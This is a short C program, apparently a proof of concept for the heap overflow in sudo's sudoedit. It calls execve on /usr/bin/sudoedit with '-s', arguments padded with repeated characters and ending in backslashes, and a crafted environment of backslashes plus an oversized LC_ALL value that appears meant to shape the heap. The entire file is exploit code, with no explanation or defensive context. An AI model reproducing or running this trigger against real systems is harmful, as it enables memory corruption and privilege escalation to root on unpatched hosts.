#include <unistd.h>
#include <string.h>

int main(void)
{
	// Build argv list
	char smash_a[256] = {0};
	char smash_b[256] = {0};

	int count = 64;
	memset(smash_a, 'a', count);
	smash_a[count] = '\\';

	count = 40;
	memset(smash_b, 'b', count);
	smash_b[count] = '\\';

	char *argv[] = {
		"/usr/bin/sudoedit",
		"-s",
		smash_a,
		smash_b,
		NULL
	};

	// Build environment variables
	char lc_value[512] = {0};
	strcpy(lc_value, "LC_ALL=C.UTF-8@");
	memset(lc_value + 15, 'c', 214);

	char *envp[256] = {0};
	count = 0;
	for (int i = 0; i < 70; i++)
		envp[count++] = "\\";

	envp[count++] = "m/au";
	envp[count++] = lc_value;
	envp[count++] = NULL;

	execve("/usr/bin/sudoedit", argv, envp);
	return 0;
}
